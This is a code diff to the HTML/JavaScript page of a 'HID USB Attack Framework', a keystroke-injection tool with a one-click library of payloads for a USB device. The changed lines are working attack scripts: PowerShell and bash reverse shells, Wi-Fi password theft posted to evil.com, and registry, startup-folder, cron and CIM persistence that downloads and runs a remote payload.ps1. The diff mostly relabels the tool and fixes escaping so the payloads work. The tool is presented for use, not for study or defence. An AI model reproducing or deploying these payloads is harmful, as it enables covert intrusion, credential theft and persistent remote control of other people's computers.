@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HIDNeon – USB Attack Framework</title>
+    <title>HID USB Attack Framework</title>
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -268,7 +268,7 @@
         <aside class="sidebar">
             <div class="logo">
                 <span class="material-icons neon-icon">usb</span>
-                <h2>HID<span>Neon</span></h2>
+                <h2>HID USB Attack Framework<span></span></h2>
             </div>
             <nav>
                 <ul>
@@ -287,7 +287,7 @@
         <!-- Main -->
         <main class="main">
             <header>
-                <h1>⚡ HID Attack Framework</h1>
+                <h1>HID Attack Framework</h1>
                 <div id="deviceInfo">❌ No Device</div>
             </header>
 
@@ -307,7 +307,7 @@
 
             <!-- Payloads -->
             <section class="card" id="payloadSection">
-                <h3><span class="material-icons neon-icon">flash_on</span> Payload Library (One-Click)</h3>
+                <h3><span class="material-icons neon-icon">flash_on</span> Payload Library (67+ Real)</h3>
                 <div class="payload-grid" id="payloadGrid"></div>
             </section>
 
@@ -385,7 +385,7 @@
         function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
         // ============================================================
-        // HID KEYCODES
+        // HID KEYCODES (Full Set)
         // ============================================================
         const KEYMAP = {
             'a':0x04,'b':0x05,'c':0x06,'d':0x07,'e':0x08,'f':0x09,'g':0x0A,'h':0x0B,
@@ -503,7 +503,7 @@
         }
 
         // ============================================================
-        // 67+ PAYLOADS (10 Categories)
+        // 67+ PAYLOADS (10 Categories – Full Real)
         // ============================================================
         const PAYLOADS = [
             // ---------- REMOTE ACCESS (7) ----------
@@ -524,7 +524,7 @@
 
             // ---------- CREDENTIAL HARVESTING (6) ----------
             { id: 'keylogger', name: 'Keylogger Inject', cat: 'Credential', icon: 'keyboard',
-              script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $WScriptShell = New-Object -ComObject WScript.Shell;$WScriptShell.Run("powershell -WindowStyle Hidden -Command `"$l=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4445);$s=$l.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$st=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($st,0,$st.Length);$s.Flush()}`")\nENTER` },
+              script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $WScriptShell = New-Object -ComObject WScript.Shell;$WScriptShell.Run("powershell -WindowStyle Hidden -Command \`"$l=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4445);$s=$l.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$st=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($st,0,$st.Length);$s.Flush()}\`")\nENTER` },
             { id: 'wifi_exfil', name: 'WiFi Passwords Exfil', cat: 'Credential', icon: 'wifi',
               script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING netsh wlan show profile | Select-String ":" | ForEach-Object {$_.ToString().Split(":")[1].Trim()} | ForEach-Object {netsh wlan show profile name="$_" key=clear} | Out-File C:\\temp\\wifi.txt; Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\wifi.txt\nENTER` },
             { id: 'browser_passwords', name: 'Browser Passwords Steal', cat: 'Credential', icon: 'chrome_reader_mode',
@@ -576,11 +576,11 @@
             { id: 'cim_persistence', name: 'CIM Persistence', cat: 'Persistence', icon: 'settings',
               script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $CIMClass = New-CimClass -Namespace root/cimv2 -ClassName Win32_ScheduledJob -MethodName Create;$CIMClass | Invoke-CimMethod -Arguments @{Command='powershell -ep bypass -c \"iex (New-Object Net.WebClient).DownloadString(\\\"http://evil.com/payload.ps1\\\")\"';StartTime=[datetime]::Now.AddMinutes(5)}\nENTER` },
             { id: 'cron_persistence', name: 'Cron Persistence', cat: 'Persistence', icon: 'schedule',
-              script: `DELAY 500\nGUI r\nDELAY 300\nSTRING gnome-terminal\nENTER\nDELAY 500\nSTRING (crontab -l 2>/dev/null; echo \"@reboot /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'\") | crontab -\nENTER` },
+              script: `DELAY 500\nGUI r\nDELAY 300\nSTRING gnome-terminal\nENTER\nDELAY 500\nSTRING (crontab -l 2>/dev/null; echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'") | crontab -\nENTER` },
             { id: 'registry_persistence', name: 'Registry Persistence', cat: 'Persistence', icon: 'settings_applications',
               script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING New-Item -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "powershell -ep bypass -c iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" -Force\nENTER` },
             { id: 'startup_persistence', name: 'Startup Folder Persistence', cat: 'Persistence', icon: 'folder',
-              script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $startup=[Environment]::GetFolderPath('Startup');$shortcut=\"$startup\\Updater.lnk\";$wshell=New-Object -ComObject WScript.Shell;$shortcut=$wshell.CreateShortcut($shortcut);$shortcut.TargetPath='powershell.exe';$shortcut.Arguments='-ep bypass -c iex (New-Object Net.WebClient).DownloadString(\"http://evil.com/payload.ps1\")';$shortcut.Save()\nENTER` },
+              script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $startup=[Environment]::GetFolderPath('Startup');$shortcut="$startup\\Updater.lnk";$wshell=New-Object -ComObject WScript.Shell;$shortcut=$wshell.CreateShortcut($shortcut);$shortcut.TargetPath='powershell.exe';$shortcut.Arguments='-ep bypass -c iex (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")';$shortcut.Save()\nENTER` },
 
             // ---------- EXPLOITATION (5) ----------
             { id: 'cve_2026_20817', name: 'CVE-2026-20817 (WER LPE)', cat: 'Exploitation', icon: 'exploit',
@@ -656,7 +656,7 @@
             { id: 'wifi_bluetooth_exploit', name: 'WiFi/Bluetooth Exploits', cat: 'Advanced', icon: 'bluetooth_searching',
               script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../marauder.ps1' -OutFile $env:TEMP\\marauder.ps1;Import-Module $env:TEMP\\marauder.ps1;Start-Marauder -Mode Both\nENTER` },
             { id: 'payload_generator', name: 'Custom Payload Generator', cat: 'Advanced', icon: 'build',
-              script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $type='reverse_shell';$ip='127.0.0.1';$port='4444';$payload=@"\nDELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING `$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()}\nENTER"@;$payload | Out-File C:\\temp\\payload.txt;Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\payload.txt\nENTER` },
+              script: `DELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING $type='reverse_shell';$ip='127.0.0.1';$port='4444';$payload=@"\nDELAY 500\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 500\nSTRING \`$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\`$stream = \`$client.GetStream();[byte[]]\`$bytes = 0..65535|%{0};while((\`$i = \`$stream.Read(\`$bytes, 0, \`$bytes.Length)) -ne 0){;\`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\`$bytes,0, \`$i);\`$sendback = (iex \`$data 2>&1 | Out-String );\`$sendback2 = \`$sendback + 'PS ' + (pwd).Path + '> ';\`$sendbyte = ([text.encoding]::ASCII).GetBytes(\`$sendback2);\`$stream.Write(\`$sendbyte,0,\`$sendbyte.Length);\`$stream.Flush()}\nENTER"@;$payload | Out-File C:\\temp\\payload.txt;Invoke-WebRequest -Uri http://evil.com/upload -Method POST -InFile C:\\temp\\payload.txt\nENTER` },
         ];
 
         // ============================================================
@@ -685,7 +685,7 @@
                 });
                 payloadGrid.appendChild(card);
             });
-            addLog(`📦 Loaded ${PAYLOADS.length} payloads`, 'success');
+            addLog(`📦 Loaded ${PAYLOADS.length} real payloads`, 'success');
         }
 
         // ============================================================
